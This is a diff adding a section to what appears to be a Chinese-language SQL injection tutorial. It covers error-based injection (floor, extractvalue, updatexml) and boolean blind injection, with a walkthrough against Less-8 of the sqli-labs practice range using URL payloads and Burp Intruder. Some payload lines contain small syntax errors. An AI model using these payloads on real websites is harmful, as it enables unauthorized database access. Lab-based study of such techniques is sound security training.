@@ -131,3 +131,120 @@ __<font color = #FF0000>1.union操作符用于合并两个或多个Select语句�
      <figure class="thumbnails">
         <img src="picture/SQLzhuru/union注入方法.png">
 </figure>
+
+## <font color = #1E90FF>报错注入</font>
+
+### <font color = #FF0000>原理</font><BR>
+**构造payload让信息通过错误提示回显出来**
+### <font color = #FF0000>应用场景:</font><BR>
+**1.查询不回显内容，会打印错误信息<BR>2.Update，insert等语句，会打印错误信息**
+
+### <font color = #FF0000>报错注入方法:</font><BR>
+**凡是可以让错误信息显示的函数（语句），都能实现报错注入<BR>例:**
+
+- **floor**
+```mysql
+floor()		--->select count(*) from information_schema.tables group by concat(select version()),floor(rand(0)*2);
+group by 对rand()函数进行操作时产生错误
+```
+
+- **extractvalue()**
+```mysql
+extractvalue()	--->extractvalue(1,concat(0x7e,(select user()),0x7e));
+Xpath语法错误产生报错
+```
+
+- **updatexml()**
+```mysql
+updatexml()	--->select updatexml(1,concat(0x7e,(select user()),0x7e),1);
+Xpath语法错误产生报错
+```
+
+## <font color = #1E90FF>布尔盲注</font>
+### <font color = #FF0000>原理</font><BR>
+**代码存在SQL注入漏洞，然而页面不会回显数据，也不会回显错误信息<BR>只返回“Right”与“Wrong”<BR>这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的‘真’和’假‘来识别我们的判断是否正确，这就是布尔盲注**
+
+### <font color = #FF0000>布尔盲注方法:</font><BR>
+**构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入**
+- **left函数**
+	- **left(a,b)<BR>从左截取a的前b位**
+```mysql
+left(database(),1)>'s'
+database()显示数据库名称，left(a,b)从左截取a的前b位
+```
+
+- **regexp**
+	- **regexp<BR>正则表达式**
+```mysql
+select user() regexp '^r'
+user的结果为root,regexp为匹配root的正则表达式
+```
+
+- **like**
+	- **与regexp相似**
+```mysql
+select user() like 'ro%'
+使用like进行匹配
+```
+
+- **substr()函数，ascii()函数**
+	- **substr(a,b,c)<BR>从b的位置开始，截取字符串a的c长度**
+	- **ascii()将摸个字符转为ascill值**
+```mysql
+ascii(substr(select database()),1,1))=98
+```
+
+- **ordr()函数，mid()函数**
+	- **mid(a,b,c)<BR>从b的位置开始，截取字符串a的c长度**
+	- **ascii()将摸个字符转为ascill值**
+
+```mysql
+ord(substr(select database()),1,1))=114
+```
+
+### <font color = #FF0000>布尔盲注实验:</font><BR>
+**环境：sqli靶场第8关**
+
+- **1.在url后方添加?id=1,界面正常**
+	- **在后方添加 and 1='1页面异常**
+		```
+		1. http://192.168.2.149:86/Less-8/?id=1
+		2. http://192.168.2.149:86/Less-8/?id=1 and 1='1
+		```
+</figure>
+     <figure class="thumbnails">
+        <img src="picture/SQLzhuru/布尔盲注1.png">
+</figure>
+
+- **2.通过1判断出有注入点之后，在后方加入' and left(database(),1)='s' --+ 构造闭环**
+	- **界面正常**
+		```
+		http://192.168.2.149:86/Less-8/?id=1' and left(database(),1)='s' --+
+
+		```
+
+- **3.构造语句判断当前数据库的第一个表的第一个字符（可以使用bp抓包来获取全部字符）**
+	- **界面正常说明猜测的字母正确**
+		```
+		http://192.168.2.149:86/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' --+
+		```
+- **4.通过burp来获取全部字段**
+	- **4.1 打开代理，和burp开始抓包，并把包发送到ntruder模块**
+	- **4.2 把需要设着的值设为变量**
+	- **4.3 在positins模块中把需要的值add一下**
+	- **4.4 在payload模块中选泽类型，和最大最小位数**
+	- **4.5 设置完成后点击右上角start attack**
+     <figure class="thumbnails">
+        <img src="picture/SQLzhuru/布尔盲注2.png">
+		<img src="picture/SQLzhuru/布尔盲注3.png">
+	</figure>
+
+- **4.可以根据长度开判断是否正确**
+	- **打开下面的response模块发现出现 you are in !!说明这个字段是正确的**
+	<figure class="thumbnails">
+        <img src="picture/SQLzhuru/布尔盲注4.png">
+
+	</figure>
+
+- **5.可以修改limit 来查询第二张表，过程与上方相似，不做重复演示**
+	
